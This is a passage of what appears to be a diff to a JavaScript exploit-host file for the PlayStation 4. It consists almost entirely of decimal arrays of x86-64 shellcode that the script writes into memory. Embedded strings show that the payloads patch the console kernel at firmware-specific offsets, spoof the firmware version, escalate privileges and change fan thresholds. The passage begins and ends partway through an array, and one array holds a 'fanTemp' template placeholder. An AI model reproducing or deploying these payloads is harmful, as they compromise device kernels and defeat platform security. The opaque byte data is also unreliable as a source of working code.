55,139,61,140,11,0,0,72,141,21,5,12,0,0,72,141,53,48,7,0,0,232,178,254,255,255,139,61,115,11,0,0,72,141,21,204,11,0,0,72,141,53,31,7,0,0,232,153,254,255,255,139,61,90,11,0,0,72,141,21,243,11,0,0,72,141,53,21,7,0,0,232,128,254,255,255,139,61,65,11,0,0,72,141,21,2,12,0,0,72,141,53,21,7,0,0,232,103,254,255,255,139,61,40,11,0,0,72,141,21,113,11,0,0,72,141,53,26,7,0,0,232,78,254,255,255,139,61,15,11,0,0,72,141,21,24,11,0,0,72,141,53,26,7,0,0,232,53,254,255,255,139,61,246,10,0,0,72,141,21,135,11,0,0,72,141,53,30,7,0,0,232,28,254,255,255,139,61,221,10,0,0,72,141,21,198,11,0,0,72,141,53,19,7,0,0,232,3,254,255,255,139,61,196,10,0,0,72,141,21,45,11,0,0,72,141,53,8,7,0,0,232,234,253,255,255,139,61,171,10,0,0,72,141,21,52,11,0,0,72,141,53,253,6,0,0,232,209,253,255,255,139,61,146,10,0,0,72,141,21,51,11,0,0,72,141,53,243,6,0,0,232,184,253,255,255,139,61,121,10,0,0,72,141,21,154,10,0,0,72,141,53,233,6,0,0,232,159,253,255,255,139,61,96,10,0,0,72,141,21,41,11,0,0,72,141,53,223,6,0,0,232,134,253,255,255,139,61,71,10,0,0,72,141,21,48,10,0,0,72,141,53,214,6,0,0,232,109,253,255,255,139,61,46,10,0,0,72,141,21,223,10,0,0,72,141,53,211,6,0,0,232,84,253,255,255,139,61,21,10,0,0,72,141,21,62,10,0,0,72,141,53,210,6,0,0,232,59,253,255,255,139,61,252,9,0,0,72,141,21,93,10,0,0,72,141,53,208,6,0,0,232,34,253,255,255,139,61,227,9,0,0,72,141,21,228,10,0,0,72,141,53,190,6,0,0,232,9,253,255,255,139,61,202,9,0,0,72,141,21,27,10,0,0,72,141,53,178,6,0,0,232,240,252,255,255,139,61,177,9,0,0,72,141,21,194,9,0,0,72,141,53,161,6,0,0,232,215,252,255,255,139,61,152,9,0,0,72,141,21,113,10,0,0,72,141,53,143,6,0,0,232,190,252,255,255,139,61,127,9,0,0,72,141,21,40,10,0,0,72,141,53,131,6,0,0,232,165,252,255,255,139,61,102,9,0,0,72,141,21,71,10,0,0,72,141,53,129,6,0,0,232,140,252,255,255,139,61,77,9,0,0,72,141,21,126,9,0,0,72,141,53,126,6,0,0,232,115,252,255,255,139,61,52,9,0,0,72,141,21,5,10,0,0,72,141,53,123,6,0,0,232,90,252,255,255,139,61,27,9,0,0,72,141,21,20,10,0,0,72,141,53,120,6,0,0,232,65,252,255,255,139,61,2,9,0,0,72,141,21,59,9,0,0,72,141,53,117,6,0,0,232,40,252,255,255,139,61,233,8,0,0,72,141,21,218,8,0,0,72,141,53,99,6,0,0,232,15,252,255,255,139,61,208,8,0,0,72,141,21,233,8,0,0,72,141,53,81,6,0,0,232,246,251,255,255,139,61,183,8,0,0,72,141,21,168,9,0,0,72,141,53,63,6,0,0,232,221,251,255,255,139,61,158,8,0,0,72,141,21,31,9,0,0,72,141,53,45,6,0,0,232,196,251,255,255,139,61,133,8,0,0,72,141,21,62,9,0,0,72,141,53,27,6,0,0,232,171,251,255,255,139,61,108,8,0,0,72,141,21,221,8,0,0,88,72,141,53,10,6,0,0,233,145,251,255,255,72,49,192,73,137,202,15,5,114,1,195,72,131,61,197,8,0,0,0,116,24,80,255,21,188,8,0,0,89,137,8,72,199,192,255,255,255,255,72,199,194,255,255,255,255,195,70,105,114,109,119,97,114,101,32,83,112,111,111,102,101,100,32,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,85,116,105,108,46,115,112,114,120,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,46,115,112,114,120,0,115,99,101,83,121,115,85,116,105,108,83,101,110,100,83,121,115,116,101,109,78,111,116,105,102,105,99,97,116,105,111,110,87,105,116,104,84,101,120,116,0,115,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,76,97,117,110,99,104,87,101,98,66,114,111,119,115,101,114,0,37,115,10,10,10,10,10,10,10,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,85,115,101,114,83,101,114,118,105,99,101,46,115,112,114,120,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,73,110,105,116,105,97,108,105,122,101,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,71,101,116,76,111,103,105,110,85,115,101,114,73,100,76,105,115,116,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,84,101,114,109,105,110,97,116,101,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,71,101,116,85,115,101,114,78,97,109,101,0,115,99,101,85,115,101,114,83,101,114,118,105,99,101,71,101,116,73,110,105,116,105,97,108,85,115,101,114,0,83,99,101,83,121,115,67,111,114,101,82,101,98,111,111,116,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,107,101,114,110,101,108,46,115,112,114,120,0,115,99,101,75,101,114,110,101,108,82,101,98,111,111,116,0,108,105,98,83,99,101,76,105,98,99,73,110,116,101,114,110,97,108,46,115,112,114,120,0,109,97,108,108,111,99,0,102,114,101,101,0,99,97,108,108,111,99,0,114,101,97,108,108,111,99,0,109,101,109,97,108,105,103,110,0,109,101,109,115,101,116,0,109,101,109,99,112,121,0,109,101,109,99,109,112,0,115,116,114,99,112,121,0,115,116,114,110,99,112,121,0,115,116,114,99,97,116,0,115,116,114,110,99,97,116,0,115,116,114,108,101,110,0,115,116,114,99,109,112,0,115,116,114,110,99,109,112,0,115,112,114,105,110,116,102,0,115,110,112,114,105,110,116,102,0,115,115,99,97,110,102,0,115,116,114,99,104,114,0,115,116,114,114,99,104,114,0,115,116,114,115,116,114,0,115,116,114,100,117,112,0,114,105,110,100,101,120,0,105,115,100,105,103,105,116,0,97,116,111,105,0,115,116,114,108,99,112,121,0,115,116,114,101,114,114,111,114,0,95,71,101,116,112,99,116,121,112,101,0,95,83,116,111,117,108,0,98,99,111,112,121,0,115,114,97,110,100,0,97,115,99,116,105,109,101,0,97,115,99,116,105,109,101,95,114,0,103,109,116,105,109,101,0,103,109,116,105,109,101,95,115,0,108,111,99,97,108,116,105,109,101,0,108,111,99,97,108,116,105,109,101,95,114,0,109,107,116,105,109,101,0,111,112,101,110,100,105,114,0,114,101,97,100,100,105,114,0,114,101,97,100,100,105,114,95,114,0,116,101,108,108,100,105,114,0,115,101,101,107,100,105,114,0,114,101,119,105,110,100,100,105,114,0,99,108,111,115,101,100,105,114,0,100,105,114,102,100,0,103,101,116,112,114,111,103,110,97,109,101,0,102,111,112,101,110,0,102,114,101,97,100,0,102,119,114,105,116,101,0,102,115,101,101,107,0,102,116,101,108,108,0,102,99,108,111,115,101,0,102,112,114,105,110,116,102,0,108,105,98,83,99,101,83,121,115,109,111,100,117,108,101,46,115,112,114,120,0,115,99,101,83,121,115,109,111,100,117,108,101,76,111,97,100,77,111,100,117,108,101,0,108,105,98,107,101,114,110,101,108,95,119,101,98,46,115,112,114,120,0,108,105,98,107,101,114,110,101,108,95,115,121,115,46,115,112,114,120,0,95,95,115,116,97,99,107,95,99,104,107,95,103,117,97,114,100,0,95,95,115,116,97,99,107,95,99,104,107,95,102,97,105,108,0,95,95,101,114,114,111,114,0,115,99,101,75,101,114,110,101,108,69,114,114,111,114,0,115,99,101,75,101,114,110,101,108,76,111,97,100,83,116,97,114,116,77,111,100,117,108,101,0,115,99,101,75,101,114,110,101,108,65,108,108,111,99,97,116,101,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,77,97,112,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,71,101,116,68,105,114,101,99,116,77,101,109,111,114,121,83,105,122,101,0,115,99,101,75,101,114,110,101,108,83,116,97,116,0,115,99,101,75,101,114,110,101,108,79,112,101,110,0,115,99,101,75,101,114,110,101,108,82,101,97,100,0,115,99,101,75,101,114,110,101,108,76,115,101,101,107,0,115,99,101,75,101,114,110,101,108,67,108,111,115,101,0,115,99,101,75,101,114,110,101,108,83,108,101,101,112,0,115,99,101,75,101,114,110,101,108,85,115,108,101,101,112,0,115,99,101,75,101,114,110,101,108,71,101,116,116,105,109,101,111,102,100,97,121,0,115,99,101,75,101,114,110,101,108,71,101,116,80,114,111,99,101,115,115,84,105,109,101,0,115,99,101,75,101,114,110,101,108,71,101,116,67,117,114,114,101,110,116,67,112,117,0,115,121,115,99,116,108,0,115,121,115,99,116,108,98,121,110,97,109,101,0,115,121,115,97,114,99,104,0,101,120,101,99,118,101,0,112,116,104,114,101,97,100,95,115,101,108,102,0,112,116,104,114,101,97,100,95,115,101,116,97,102,102,105,110,105,116,121,95,110,112,0,115,99,101,75,101,114,110,101,108,67,114,101,97,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,68,101,108,101,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,65,100,100,85,115,101,114,69,118,101,110,116,0,115,99,101,75,101,114,110,101,108,65,100,100,82,101,97,100,69,118,101,110,116,0,103,101,116,117,105,100,0,103,101,116,103,105,100,0,103,101,116,112,105,100,0,115,101,116,117,105,100,0,115,101,116,103,105,100,0,115,101,116,114,101,117,105,100,0,115,101,116,114,101,103,105,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
+window.mira_blob_2_len = 5144;
+window.mira_blob_2 = malloc(window.mira_blob_2_len);
+write_mem(window.mira_blob_2, payload);}
 
+function fan() {var payload = [233,22,5,0,0,65,84,85,83,187,130,0,0,192,72,131,236,112,72,137,217,15,50,72,193,226,32,72,199,68,36,16,102,6,0,0,72,9,208,199,4,36,127,69,76,70,72,137,245,72,141,184,64,254,255,255,72,137,230,186,4,0,0,0,255,21,114,26,0,0,76,139,5,107,26,0,0,133,192,15,133,7,1,0,0,72,137,217,73,188,85,72,137,229,83,72,131,236,15,50,72,193,226,32,72,137,195,72,9,211,76,137,100,36,28,199,68,36,36,88,72,141,29,72,141,116,36,28,72,141,187,192,48,18,0,186,12,0,0,0,65,255,208,133,192,117,21,72,199,68,36,16,114,6,0,0,72,129,195,240,20,60,0,233,88,2,0,0,76,137,100,36,40,72,141,116,36,40,199,68,36,48,88,72,141,29,72,141,187,128,94,67,0,186,12,0,0,0,255,21,236,25,0,0,133,192,117,11,72,199,68,36,16,5,5,0,0,235,49,76,137,100,36,52,72,141,116,36,52,199,68,36,60,88,72,141,29,72,141,187,64,94,67,0,186,12,0,0,0,255,21,185,25,0,0,133,192,117,21,72,199,68,36,16,3,5,0,0,72,129,195,112,164,30,0,233,232,1,0,0,76,137,100,36,64,72,141,116,36,64,199,68,36,72,88,72,141,29,72,141,187,176,90,67,0,186,12,0,0,0,255,21,124,25,0,0,133,192,116,7,49,219,233,185,1,0,0,72,199,68,36,16,1,5,0,0,72,129,195,96,163,30,0,233,164,1,0,0,72,137,217,199,68,36,4,127,69,76,70,15,50,72,193,226,32,72,141,116,36,4,72,9,208,186,4,0,0,0,72,141,184,48,72,207,255,65,255,208,76,139,5,45,25,0,0,133,192,117,91,72,137,217,199,68,36,84,88,72,141,29,15,50,72,193,226,32,72,141,116,36,76,72,9,194,72,184,85,72,137,229,83,72,131,236,72,141,154,48,72,207,255,72,137,68,36,76,72,141,187,48,127,1,0,186,12,0,0,0,65,255,208,133,192,15,133,107,255,255,255,72,199,68,36,16,116,4,0,0,72,129,195,64,158,20,0,233,22,1,0,0,72,137,217,199,68,36,8,127,69,76,70,15,50,72,193,226,32,72,141,116,36,8,72,9,208,186,4,0,0,0,72,141,184,48,106,207,255,65,255,208,76,139,5,159,24,0,0,133,192,117,91,72,137,217,199,68,36,96,88,72,141,29,15,50,72,193,226,32,72,141,116,36,88,72,9,194,72,184,85,72,137,229,83,72,131,236,72,141,154,48,106,207,255,72,137,68,36,88,72,141,187,48,127,1,0,186,12,0,0,0,65,255,208,133,192,15,133,221,254,255,255,72,199,68,36,16,85,4,0,0,72,129,195,176,167,20,0,233,136,0,0,0,72,137,217,199,68,36,12,127,69,76,70,15,50,72,193,226,32,72,141,116,36,12,72,9,208,186,4,0,0,0,72,141,184,208,20,207,255,65,255,208,131,202,255,133,192,117,110,72,137,217,199,68,36,108,88,72,141,29,15,50,72,185,85,72,137,229,83,72,131,236,72,193,226,32,72,9,208,72,137,76,36,100,72,141,152,208,20,207,255,72,141,116,36,100,72,141,184,80,138,3,0,186,12,0,0,0,255,21,208,23,0,0,133,192,15,133,80,254,255,255,72,199,68,36,16,5,4,0,0,72,129,195,112,109,40,0,72,139,69,8,186,8,0,0,0,72,141,124,36,16,72,139,48,255,211,49,210,72,131,196,112,137,208,91,93,65,92,195,72,139,71,8,76,139,72,72,76,139,64,64,72,139,70,8,72,139,16,72,129,250,5,4,0,0,117,35,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,116,193,0,72,5,32,231,213,1,233,221,0,0,0,72,129,250,85,4,0,0,117,35,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,3,211,0,72,5,96,100,234,1,233,177,0,0,0,72,129,250,116,4,0,0,117,35,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,114,211,0,72,5,16,210,234,1,233,133,0,0,0,72,129,250,1,5,0,0,117,32,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,132,9,1,72,5,48,24,44,2,235,92,72,129,250,3,5,0,0,116,9,72,129,250,5,5,0,0,117,32,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,224,132,9,1,72,5,176,24,44,2,235,42,131,200,255,72,129,250,114,6,0,0,117,112,185,130,0,0,192,15,50,72,137,209,72,193,225,32,72,9,200,72,141,144,88,227,19,1,72,5,96,1,48,2,72,139,18,73,199,64,4,0,0,0,0,73,139,136,24,1,0,0,65,199,64,20,0,0,0,0,72,190,19,0,0,0,0,0,1,56,199,1,0,0,0,0,73,137,80,48,72,131,202,255,72,139,0,73,137,65,32,73,137,65,24,72,139,135,48,1,0,0,72,137,80,96,72,137,112,88,72,137,80,104,49,192,195,83,69,49,201,72,131,236,16,65,131,200,255,185,2,16,0,0,186,3,0,0,0,190,8,0,0,0,49,255,72,199,4,36,102,6,0,0,232,254,2,0,0,72,141,116,36,8,72,141,61,64,251,255,255,72,137,195,72,137,68,36,8,232,155,9,0,0,72,137,231,72,137,222,186,8,0,0,0,255,21,21,21,0,0,72,137,223,190,8,0,0,0,232,211,2,0,0,72,139,4,36,72,131,196,16,91,195,72,131,236,24,72,137,124,36,8,72,141,116,36,8,72,141,61,17,254,255,255,232,89,9,0,0,49,192,72,131,196,24,195,85,83,72,129,236,24,1,0,0,232,80,9,0,0,232,233,2,0,0,232,216,7,0,0,232,87,255,255,255,72,141,92,36,16,72,137,199,232,181,255,255,255,232,152,1,0,0,49,210,49,246,72,141,61,14,13,0,0,232,152,0,0,0,133,192,127,25,72,141,21,11,13,0,0,190,0,1,0,0,72,137,223,49,192,255,21,123,20,0,0,235,79,137,197,72,141,124,36,6,49,192,185,10,0,0,0,243,170,72,141,84,36,6,190,7,143,28,192,137,239,198,68,36,11,fanTemp,232,196,8,0,0,137,239,232,90,0,0,0,65,184,176,0,0,0,185,fanTemp,0,0,0,72,141,21,215,12,0,0,190,0,1,0,0,72,137,223,49,192,255,21,42,20,0,0,72,137,223,232,125,1,0,0,72,129,196,24,1,0,0,49,192,91,93,195,72,199,192,3,0,0,0,233,82,12,0,0,72,199,192,4,0,0,0,233,70,12,0,0,72,199,192,5,0,0,0,233,58,12,0,0,72,199,192,6,0,0,0,233,46,12,0,0,72,199,192,10,0,0,0,233,34,12,0,0,72,199,192,9,0,0,0,233,22,12,0,0,72,199,192,58,0,0,0,233,10,12,0,0,72,199,192,57,0,0,0,233,254,11,0,0,72,199,192,21,0,0,0,233,242,11,0,0,72,199,192,122,1,0,0,233,230,11,0,0,72,199,192,22,0,0,0,233,218,11,0,0,72,199,192,123,0,0,0,233,206,11,0,0,72,199,192,124,0,0,0,233,194,11,0,0,72,199,192,128,0,0,0,233,182,11,0,0,72,199,192,136,0,0,0,233,170,11,0,0,72,199,192,137,0,0,0,233,158,11,0,0,72,199,192,188,0,0,0,233,146,11,0,0,72,199,192,189,0,0,0,233,134,11,0,0,72,199,192,190,0,0,0,233,122,11,0,0,72,199,192,16,1,0,0,233,110,11,0,0,72,199,192,222,1,0,0,233,98,11,0,0,72,199,192,237,1,0,0,233,86,11,0,0,85,83,72,131,236,8,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,180,11,0,0,255,21,199,21,0,0,69,49,201,69,49,192,137,197,49,201,49,210,49,246,72,141,61,191,11,0,0,255,21,172,21,0,0,137,239,72,141,21,123,18,0,0,137,195,72,141,53,211,11,0,0,232,79,0,0,0,88,137,223,91,72,141,21,114,18,0,0,93,72,141,53,228,11,0,0,233,55,0,0,0,83,72,137,250,72,129,236,0,2,0,0,72,141,53,238,11,0,0,72,137,227,49,192,72,137,223,255,21,229,19,0,0,72,137,222,191,222,0,0,0,255,21,39,18,0,0,72,129,196,0,2,0,0,91,195,72,199,192,79,2,0,0,233,170,10,0,0,72,199,192,80,2,0,0,233,158,10,0,0,72,131,236,8,72,137,241,49,210,72,137,254,69,49,192,191,82,2,0,0,49,192,232,128,10,0,0,90,195,72,199,192,221,1,0,0,233,117,10,0,0,72,199,192,73,0,0,0,233,105,10,0,0,72,199,192,74,0,0,0,233,93,10,0,0,72,199,192,65,0,0,0,233,81,10,0,0,72,199,192,203,0,0,0,233,69,10,0,0,72,199,192,204,0,0,0,233,57,10,0,0,72,199,192,35,2,0,0,233,45,10,0,0,72,199,192,60,2,0,0,233,33,10,0,0,83,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,35,11,0,0,255,21,151,20,0,0,72,141,21,216,17,0,0,72,141,53,39,11,0,0,137,195,137,199,232,58,255,255,255,137,223,72,141,21,87,19,0,0,72,141,53,21,11,0,0,232,37,255,255,255,137,223,72,141,21,210,17,0,0,72,141,53,5,11,0,0,232,16,255,255,255,137,223,72,141,21,45,18,0,0,72,141,53,247,10,0,0,232,251,254,255,255,137,223,72,141,21,184,18,0,0,72,141,53,234,10,0,0,232,230,254,255,255,137,223,72,141,21,99,18,0,0,72,141,53,222,10,0,0,232,209,254,255,255,137,223,72,141,21,62,17,0,0,72,141,53,208,10,0,0,232,188,254,255,255,137,223,72,141,21,233,17,0,0,72,141,53,194,10,0,0,232,167,254,255,255,137,223,72,141,21,244,16,0,0,72,141,53,180,10,0,0,232,146,254,255,255,137,223,72,141,21,167,17,0,0,72,141,53,166,10,0,0,232,125,254,255,255,137,223,72,141,21,82,17,0,0,72,141,53,153,10,0,0,232,104,254,255,255,137,223,72,141,21,165,17,0,0,72,141,53,139,10,0,0,232,83,254,255,255,137,223,72,141,21,80,18,0,0,72,141,53,126,10,0,0,232,62,254,255,255,137,223,72,141,21,235,17,0,0,72,141,53,112,10,0,0,232,41,254,255,255,137,223,72,141,21,54,17,0,0,72,141,53,98,10,0,0,232,20,254,255,255,137,223,72,141,21,217,17,0,0,72,141,53,85,10,0,0,232,255,253,255,255,137,223,72,141,21,100,16,0,0,72,141,53,72,10,0,0,232,234,253,255,255,137,223,72,141,21,31,17,0,0,72,141,53,60,10,0,0,232,213,253,255,255,137,223,72,141,21,218,17,0,0,72,141,53,46,10,0,0,232,192,253,255,255,137,223,72,141,21,101,16,0,0,72,141,53,32,10,0,0,232,171,253,255,255,137,223,72,141,21,152,16,0,0,72,141,53,19,10,0,0,232,150,253,255,255,137,223,72,141,21,235,16,0,0,72,141,53,5,10,0,0,232,129,253,255,255,137,223,72,141,21,222,16,0,0,72,141,53,248,9,0,0,232,108,253,255,255,137,223,72,141,21,33,16,0,0,72,141,53,226,9,0,0,232,87,253,255,255,137,223,72,141,21,52,17,0,0,72,141,53,212,9,0,0,232,66,253,255,255,137,223,72,141,21,47,17,0,0,72,141,53,199,9,0,0,232,45,253,255,255,137,223,72,141,21,50,16,0,0,72,141,53,183,9,0,0,232,24,253,255,255,137,223,72,141,21,117,15,0,0,72,141,53,170,9,0,0,232,3,253,255,255,137,223,72,141,21,192,15,0,0,72,141,53,158,9,0,0,232,238,252,255,255,137,223,72,141,21,59,16,0,0,72,141,53,148,9,0,0,232,217,252,255,255,137,223,72,141,21,254,15,0,0,72,141,53,134,9,0,0,232,196,252,255,255,137,223,72,141,21,81,16,0,0,72,141,53,119,9,0,0,232,175,252,255,255,137,223,72,141,21,164,15,0,0,72,141,53,99,9,0,0,232,154,252,255,255,137,223,72,141,21,239,14,0,0,72,141,53,83,9,0,0,232,133,252,255,255,137,223,72,141,21,242,15,0,0,72,141,53,70,9,0,0,232,112,252,255,255,137,223,72,141,21,61,15,0,0,72,141,53,43,9,0,0,232,91,252,255,255,137,223,72,141,21,40,16,0,0,72,141,53,30,9,0,0,232,70,252,255,255,137,223,72,141,21,227,15,0,0,72,141,53,2,9,0,0,232,49,252,255,255,137,223,72,141,21,38,16,0,0,72,141,53,252,8,0,0,232,28,252,255,255,137,223,72,141,21,209,15,0,0,72,141,53,238,8,0,0,232,7,252,255,255,137,223,72,141,21,124,15,0,0,72,141,53,226,8,0,0,232,242,251,255,255,137,223,72,141,21,199,15,0,0,72,141,53,215,8,0,0,232,221,251,255,255,137,223,72,141,21,194,14,0,0,72,141,53,206,8,0,0,232,200,251,255,255,137,223,72,141,21,109,15,0,0,72,141,53,192,8,0,0,232,179,251,255,255,137,223,72,141,21,80,14,0,0,72,141,53,179,8,0,0,232,158,251,255,255,137,223,72,141,21,43,14,0,0,72,141,53,166,8,0,0,232,137,251,255,255,137,223,72,141,21,158,15,0,0,72,141,53,155,8,0,0,232,116,251,255,255,137,223,72,141,21,233,13,0,0,72,141,53,142,8,0,0,232,95,251,255,255,137,223,72,141,21,220,13,0,0,72,141,53,129,8,0,0,232,74,251,255,255,137,223,72,141,21,87,15,0,0,72,141,53,118,8,0,0,232,53,251,255,255,137,223,72,141,21,50,14,0,0,72,141,53,106,8,0,0,232,32,251,255,255,137,223,72,141,21,181,13,0,0,72,141,53,91,8,0,0,232,11,251,255,255,137,223,72,141,21,112,14,0,0,72,141,53,82,8,0,0,232,246,250,255,255,137,223,72,141,21,59,14,0,0,72,141,53,67,8,0,0,232,225,250,255,255,137,223,72,141,21,198,14,0,0,72,141,53,52,8,0,0,232,204,250,255,255,137,223,72,141,21,169,13,0,0,72,141,53,38,8,0,0,232,183,250,255,255,137,223,72,141,21,60,14,0,0,72,141,53,23,8,0,0,232,162,250,255,255,137,223,72,141,21,55,14,0,0,72,141,53,8,8,0,0,232,141,250,255,255,137,223,91,72,141,21,81,13,0,0,72,141,53,249,7,0,0,233,119,250,255,255,72,131,236,8,139,61,19,15,0,0,72,141,21,236,14,0,0,72,141,53,228,7,0,0,232,90,250,255,255,139,61,250,14,0,0,72,141,21,163,14,0,0,72,141,53,220,7,0,0,232,65,250,255,255,139,61,225,14,0,0,72,141,21,122,14,0,0,72,141,53,210,7,0,0,232,40,250,255,255,139,61,200,14,0,0,72,141,21,153,14,0,0,72,141,53,202,7,0,0,232,15,250,255,255,139,61,175,14,0,0,72,141,21,96,14,0,0,72,141,53,192,7,0,0,232,246,249,255,255,139,61,150,14,0,0,72,141,21,55,14,0,0,72,141,53,183,7,0,0,232,221,249,255,255,139,61,125,14,0,0,72,141,21,6,14,0,0,72,141,53,173,7,0,0,232,196,249,255,255,139,61,100,14,0,0,72,141,21,29,14,0,0,72,141,53,165,7,0,0,232,171,249,255,255,139,61,75,14,0,0,72,141,21,204,13,0,0,72,141,53,160,7,0,0,232,146,249,255,255,139,61,50,14,0,0,72,141,21,19,14,0,0,72,141,53,158,7,0,0,232,121,249,255,255,139,61,25,14,0,0,72,141,21,170,13,0,0,72,141,53,153,7,0,0,232,96,249,255,255,139,61,0,14,0,0,72,141,21,201,13,0,0,72,141,53,151,7,0,0,232,71,249,255,255,139,61,231,13,0,0,72,141,21,168,13,0,0,88,72,141,53,150,7,0,0,233,45,249,255,255,72,199,192,37,0,0,0,233,215,3,0,0,72,199,192,54,0,0,0,233,203,3,0,0,72,199,192,11,0,0,0,233,191,3,0,0,72,131,236,8,72,141,53,164,13,0,0,72,141,61,113,7,0,0,72,199,5,18,14,0,0,0,0,0,0,232,255,248,255,255,133,192,116,42,72,141,53,130,13,0,0,72,141,61,94,7,0,0,232,232,248,255,255,133,192,116,19,72,141,53,107,13,0,0,72,141,61,90,7,0,0,232,209,248,255,255,139,61,89,13,0,0,72,141,21,90,13,0,0,72,141,53,84,7,0,0,232,160,248,255,255,139,61,64,13,0,0,72,141,21,129,13,0,0,72,141,53,77,7,0,0,232,135,248,255,255,139,61,39,13,0,0,72,141,21,160,13,0,0,72,141,53,69,7,0,0,232,110,248,255,255,139,61,14,13,0,0,72,141,21,103,13,0,0,72,141,53,52,7,0,0,232,85,248,255,255,139,61,245,12,0,0,72,141,21,142,13,0,0,72,141,53,42,7,0,0,232,60,248,255,255,139,61,220,12,0,0,72,141,21,157,13,0,0,72,141,53,42,7,0,0,232,35,248,255,255,139,61,195,12,0,0,72,141,21,12,13,0,0,72,141,53,47,7,0,0,232,10,248,255,255,139,61,170,12,0,0,72,141,21,179,12,0,0,72,141,53,47,7,0,0,232,241,247,255,255,139,61,145,12,0,0,72,141,21,34,13,0,0,72,141,53,51,7,0,0,232,216,247,255,255,139,61,120,12,0,0,72,141,21,97,13,0,0,72,141,53,40,7,0,0,232,191,247,255,255,139,61,95,12,0,0,72,141,21,200,12,0,0,72,141,53,29,7,0,0,232,166,247,255,255,139,61,70,12,0,0,72,141,21,207,12,0,0,72,141,53,18,7,0,0,232,141,247,255,255,139,61,45,12,0,0,72,141,21,206,12,0,0,72,141,53,8,7,0,0,232,116,247,255,255,139,61,20,12,0,0,72,141,21,53,12,0,0,72,141,53,254,6,0,0,232,91,247,255,255,139,61,251,11,0,0,72,141,21,196,12,0,0,72,141,53,244,6,0,0,232,66,247,255,255,139,61,226,11,0,0,72,141,21,203,11,0,0,72,141,53,235,6,0,0,232,41,247,255,255,139,61,201,11,0,0,72,141,21,122,12,0,0,72,141,53,232,6,0,0,232,16,247,255,255,139,61,176,11,0,0,72,141,21,217,11,0,0,72,141,53,231,6,0,0,232,247,246,255,255,139,61,151,11,0,0,72,141,21,248,11,0,0,72,141,53,229,6,0,0,232,222,246,255,255,139,61,126,11,0,0,72,141,21,127,12,0,0,72,141,53,211,6,0,0,232,197,246,255,255,139,61,101,11,0,0,72,141,21,182,11,0,0,72,141,53,199,6,0,0,232,172,246,255,255,139,61,76,11,0,0,72,141,21,93,11,0,0,72,141,53,182,6,0,0,232,147,246,255,255,139,61,51,11,0,0,72,141,21,12,12,0,0,72,141,53,164,6,0,0,232,122,246,255,255,139,61,26,11,0,0,72,141,21,195,11,0,0,72,141,53,152,6,0,0,232,97,246,255,255,139,61,1,11,0,0,72,141,21,226,11,0,0,72,141,53,150,6,0,0,232,72,246,255,255,139,61,232,10,0,0,72,141,21,25,11,0,0,72,141,53,147,6,0,0,232,47,246,255,255,139,61,207,10,0,0,72,141,21,160,11,0,0,72,141,53,144,6,0,0,232,22,246,255,255,139,61,182,10,0,0,72,141,21,175,11,0,0,72,141,53,141,6,0,0,232,253,245,255,255,139,61,157,10,0,0,72,141,21,214,10,0,0,72,141,53,138,6,0,0,232,228,245,255,255,139,61,132,10,0,0,72,141,21,117,10,0,0,72,141,53,120,6,0,0,232,203,245,255,255,139,61,107,10,0,0,72,141,21,132,10,0,0,72,141,53,102,6,0,0,232,178,245,255,255,139,61,82,10,0,0,72,141,21,67,11,0,0,72,141,53,84,6,0,0,232,153,245,255,255,139,61,57,10,0,0,72,141,21,186,10,0,0,72,141,53,66,6,0,0,232,128,245,255,255,139,61,32,10,0,0,72,141,21,217,10,0,0,72,141,53,48,6,0,0,232,103,245,255,255,139,61,7,10,0,0,72,141,21,120,10,0,0,88,72,141,53,31,6,0,0,233,77,245,255,255,72,49,192,73,137,202,15,5,114,1,195,72,131,61,96,10,0,0,0,116,24,80,255,21,87,10,0,0,89,137,8,72,199,192,255,255,255,255,72,199,194,255,255,255,255,195,47,100,101,118,47,105,99,99,95,102,97,110,0,85,110,97,98,108,101,32,116,111,32,79,112,101,110,32,70,97,110,32,83,101,116,116,105,110,103,115,33,0,70,97,110,32,84,104,114,101,115,104,111,108,100,32,83,101,116,32,116,111,32,37,105,194,176,67,47,37,105,194,176,70,33,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,85,116,105,108,46,115,112,114,120,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,46,115,112,114,120,0,115,99,101,83,121,115,85,116,105,108,83,101,110,100,83,121,115,116,101,109,78,111,116,105,102,105,99,97,116,105,111,110,87,105,116,104,84,101,120,116,0,115,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,76,97,117,110,99,104,87,101,98,66,114,111,119,115,101,114,0,37,115,0,108,105,98,83,99,101,76,105,98,99,73,110,116,101,114,110,97,108,46,115,112,114,120,0,109,97,108,108,111,99,0,102,114,101,101,0,99,97,108,108,111,99,0,114,101,97,108,108,111,99,0,109,101,109,97,108,105,103,110,0,109,101,109,115,101,116,0,109,101,109,99,112,121,0,109,101,109,99,109,112,0,115,116,114,99,112,121,0,115,116,114,110,99,112,121,0,115,116,114,99,97,116,0,115,116,114,110,99,97,116,